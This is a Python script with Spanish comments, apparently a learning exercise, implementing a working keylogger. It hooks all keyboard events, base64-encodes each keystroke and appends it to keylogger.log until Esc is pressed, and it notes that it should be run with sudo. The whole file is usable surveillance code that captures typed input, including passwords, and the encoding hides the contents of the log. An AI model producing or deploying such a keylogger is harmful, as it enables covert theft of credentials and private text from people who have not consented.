#!/usr/bin/python3
# -*- encoding: utf-8 -*-

import keyboard
import atexit
import os
import base64  # <--- Nueva librería para codificar
from functools import partial

class Keylogger:
    def __init__(self, file_path='keylogger.log', terminate_key='esc'):
        self.file_path = file_path
        self.terminate_key = terminate_key
        self.is_down = {}
        self.MAP = {"space": " ", "\r": "\n"}

        # Abrir archivo
        self.output = open(self.file_path, "a")
        atexit.register(self.onexit)
        
        print(f"[!] Keylogger (Base64) iniciado.")
        print(f"[!] Pulsa '{self.terminate_key}' para detenerlo.")

        keyboard.hook(self.callback)
        keyboard.wait(self.terminate_key)

    def callback(self, event):
        if event.event_type in ("up", "down"):
            key = self.MAP.get(event.name, event.name)
            modifier = len(key) > 1

            if not modifier and event.event_type == "down":
                return
            
            if modifier:
                if event.event_type == "down":
                    if self.is_down.get(key, False): return
                    else: self.is_down[key] = True
                elif event.event_type == "up":
                    self.is_down[key] = False
                
                key = f" [{key} ({event.event_type})] "
            elif key == "\r":
                key = "\n"

            # --- CODIFICACIÓN BASE64 ---
            # 1. Convertimos el texto a bytes (UTF-8)
            key_bytes = key.encode('utf-8')
            # 2. Codificamos a Base64 (esto devuelve bytes)
            base64_bytes = base64.b64encode(key_bytes)
            # 3. Convertimos los bytes de vuelta a string para escribir en el archivo
            base64_string = base64_bytes.decode('utf-8')

            # Escribimos la cadena codificada y un salto de línea
            self.output.write(base64_string + "\n")
            self.output.flush()

    def onexit(self):
        print("\n[!] Saliendo...")
        self.output.close()

if __name__ == "__main__":
    try:
        # Recuerda ejecutar con sudo
        Keylogger(terminate_key='esc') 
    except KeyboardInterrupt:
        pass
